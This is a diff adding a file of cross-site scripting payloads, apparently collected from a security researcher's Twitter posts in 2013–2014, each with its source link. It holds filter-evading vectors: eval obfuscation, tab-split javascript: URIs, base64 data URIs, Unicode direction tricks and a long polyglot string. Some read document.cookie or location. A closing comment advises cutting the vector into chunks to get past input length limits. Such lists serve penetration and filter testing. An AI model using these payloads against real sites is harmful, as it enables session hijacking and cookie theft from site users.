@@ -1,0 +1,57 @@
+#
+# Misc XSS awesomeness from soaj1664ashar feed
+# https://twitter.com/soaj1664ashar
+#
+
+# https://twitter.com/soaj1664ashar/status/424961050258063360
+# 2:46 AM - 20 Jan 2014
+<iframe/onload=action=/confir/.source+'m';eval(action)(1)>
+
+# https://twitter.com/soaj1664ashar/status/418454103895728128
+# 3:50 AM - 2 Jan 2014
+ <!--[if WindowsEdition]><script>confirm(location);</script><![endif]-->
+
+
+# https://twitter.com/soaj1664ashar/status/418163175788265472/
+# 8:34 AM - 1 Jan 2014 :-)
+><img src=http://i.imgur.com/ISxZ5dd.jpg  onmouseover=confirm(/Happy_New_Year_2014/)>
+
+# https://twitter.com/soaj1664ashar/status/416613093490163712
+# Dec 28, 2013
+# appears to be specific for a sanitization filter which alters the input
+# into an XSS-able form.
+#<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(document.cookie)> <button/type=submit>
+
+# https://twitter.com/soaj1664ashar/status/407438076118462464
+# 6:16 PM - 2 Dec 2013
+<style/onload    =    !-alert&#x28;1&#x29;>
+
+# https://twitter.com/soaj1664ashar/status/407086397493747712
+# Dec 1, 2013
+<iframe/name="if(0){\u0061lert(1)}else{\u0061lert(1)}"/onload="eval(name)";> 
+
+# https://twitter.com/soaj1664ashar/status/400335443805237248
+# not sure who is author
+# FF specific bug
+# Nov 13, 2013
+<a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+" style="FONT-SIZE: 1000pt; FONT-FAMILY: Comic Sans MS; position:absolute;top:0;left:0;width:1000;height:1000;opacity:0">ClickMe</a>
+
+# https://twitter.com/soaj1664ashar/status/400257634449637376
+<svg><;(noitacol)mrifnoc=daolno ;howthehellitworks`=wtf>`
+
+# https://twitter.com/soaj1664ashar/status/400257634449637376
+# http://jsfiddle.net/DH8wM/10/
+<svg><‮GMO=`<ftw=`skrowtillehehtwoh; onload=confirm(location);
+
+# https://twitter.com/soaj1664ashar/status/396307604734881792
+"><img src=x onerror=confirm(1);>
+#&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
+
+# https://twitter.com/soaj1664ashar/status/385461391366168576
+<img/src=x alt=confirm(1) onmouseover=eval(alt)>
+
+# https://twitter.com/soaj1664ashar/status/367350377894518784
+# http://pastebin.com/TVH8t5bQ
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(document.cookie)</script>"><img/id="confirm&lpar;1&#x29;"/alt="/"src="/"onerror=eval(id&#x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+
+# If a site has length restriction on input field then use chunk of your choice from the above vector :P
